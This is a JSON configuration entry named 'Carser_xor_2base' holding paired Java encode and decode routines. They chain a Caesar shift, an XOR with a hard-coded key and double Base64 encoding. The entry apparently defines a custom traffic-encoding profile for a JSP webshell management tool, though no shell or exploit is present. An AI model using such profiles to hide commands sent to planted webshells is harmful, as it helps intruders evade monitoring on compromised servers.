[{"encode":"private static byte[] Encrypt(byte[] data) throws Exception\n    {\n        String str = new String(data);\n\n        char c;\n        int offset = 3;\n        StringBuilder str1 = new StringBuilder();\n\n        for (int i = 0; i < str.length(); i++) {\n\n            c = str.charAt(i);\n            if (c >= 'a' && c <= 'z') {\n                c = (char) (((c - 'a') + offset) % 26 + 'a');\n            } else if (c >= 'A' && c <= 'Z') {\n                c = (char) (((c - 'A') + offset) % 26 + 'A');\n            }\n            str1.append(c);\n        }\n\n\n        //转换回 byte[]\n        String str2 = str1.toString();\n        data = str2.getBytes();\n\n        String key=\"25f9e794323b4538\";\n        for (int i = 0; i < data.length; i++) {\n            data[i] = (byte) ((data[i]) ^ (key.getBytes()[i + 1 & 15]));\n        }\n\n        byte[] encrypted ;\n        Class baseCls;\n        try\n        {\n            baseCls=Class.forName(\"java.util.Base64\");\n            Object Encoder=baseCls.getMethod(\"getEncoder\", null).invoke(baseCls, null);\n            encrypted= (byte[]) Encoder.getClass().getMethod(\"encode\", new Class[]{byte[].class}).invoke(Encoder, new Object[]{data});\n             encrypted= (byte[]) Encoder.getClass().getMethod(\"encode\", new Class[]{byte[].class}).invoke(Encoder, new Object[]{encrypted});\n\n        }\n        catch (Throwable error)\n        {\n            baseCls=Class.forName(\"sun.misc.BASE64Encoder\");\n            Object Encoder=baseCls.newInstance();\n            String result=(String) Encoder.getClass().getMethod(\"encode\",new Class[]{byte[].class}).invoke(Encoder, new Object[]{data});\n            result=result.replace(\"\\n\", \"\").replace(\"\\r\", \"\");\n             result=(String) Encoder.getClass().getMethod(\"encode\",new Class[]{byte[].class}).invoke(Encoder, new Object[]{result});\n             result=result.replace(\"\\n\", \"\").replace(\"\\r\", \"\");\n\n\n            encrypted=result.getBytes();\n\n        }\n\n\n        return encrypted;\n    }","name":"Carser_xor_2base","id":31,"type":"jsp","decode":"private byte[] Decrypt(byte[] data) throws Exception\n{\n        byte[] decodebs;\n        Class baseCls ;\n        try{\n                baseCls=Class.forName(\"java.util.Base64\");\n                Object Decoder=baseCls.getMethod(\"getDecoder\", null).invoke(baseCls, null);\n                decodebs=(byte[]) Decoder.getClass().getMethod(\"decode\", new Class[]{byte[].class}).invoke(Decoder, new Object[]{data});\n                decodebs=(byte[]) Decoder.getClass().getMethod(\"decode\", new Class[]{byte[].class}).invoke(Decoder, new Object[]{decodebs});\n            }\n\n        catch (Throwable e)\n            {\n                baseCls = Class.forName(\"sun.misc.BASE64Decoder\");\n                Object Decoder=baseCls.newInstance();\n                decodebs=(byte[]) Decoder.getClass().getMethod(\"decodeBuffer\",new Class[]{String.class}).invoke(Decoder, new Object[]{new String(data)});\n                decodebs=(byte[]) Decoder.getClass().getMethod(\"decodeBuffer\",new Class[]{String.class}).invoke(Decoder, new Object[]{new String(decodebs)});\n\n            }\n\n        String key=\"25f9e794323b4538\";\n        for (int i = 0; i < decodebs.length; i++) {\n            decodebs[i] = (byte) ((decodebs[i]) ^ (key.getBytes()[i + 1 & 15]));\n            }\n\n        \n\n        String str = new String(decodebs);\n\n        char c;\n        int offset = 3;\n        StringBuilder str1 = new StringBuilder();\n\n\n        for (int i = 0; i < str.length(); i++) {\n\n            c = str.charAt(i);\n            if (c >= 'a' && c <= 'z') {\n                    c = (char) (((c - 'a') - offset + 26) % 26 + 'a');\n            } else if (c >= 'A' && c <= 'Z') {\n                    c = (char) (((c - 'A') - offset + 26) % 26 + 'A');\n            }\n            str1.append(c);\n        }\n\n\n        //转换回 byte[]\n        String str2 = str1.toString();\n        decodebs = str2.getBytes();\n\n\n    return decodebs;\n    \n}"}]